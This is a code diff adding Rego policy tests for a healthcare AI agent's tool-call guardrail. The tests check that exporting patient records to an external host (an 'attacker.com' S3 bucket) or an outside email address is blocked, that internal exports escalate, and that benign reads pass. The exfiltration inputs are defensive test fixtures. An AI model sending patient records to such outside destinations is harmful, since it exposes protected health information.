@@ -30,3 +30,24 @@ test_benign_schedule_read_allowed {
     d := healthcare.decision with input as {"tool_name": "get_appointment", "tool_params": {"date": "today"}}
     d == "allow"
 }
+
+# === F-21 PHI export-egress (clean-param exfil: no PHI field key in params) ===
+test_export_records_external_blocked {
+    inp := {"tool_name": "export_records", "tool_params": {"destination": "s3://audit-backup-external.attacker.com"}}
+    healthcare.decision == "block" with input as inp
+    healthcare.rule_id == "phi_export_exfil_blocked" with input as inp
+}
+test_export_records_email_external_blocked {
+    healthcare.decision == "block" with input as {"tool_name": "upload_records", "tool_params": {"to": "researcher@pharma-trial.com"}}
+}
+test_export_records_internal_escalates {
+    healthcare.decision == "escalate" with input as {"tool_name": "export_records", "tool_params": {"destination": "internal-vault"}}
+}
+# existing PHI-key egress still blocks (precedence holds)
+test_phi_key_egress_still_blocked {
+    healthcare.decision == "block" with input as {"tool_name": "export_records", "tool_params": {"mrn": "88231", "destination": "internal-vault"}}
+}
+# benign reads unaffected
+test_benign_get_patient_allowed {
+    healthcare.decision == "allow" with input as {"tool_name": "get_patient", "tool_params": {"patient_id": "P1"}}
+}
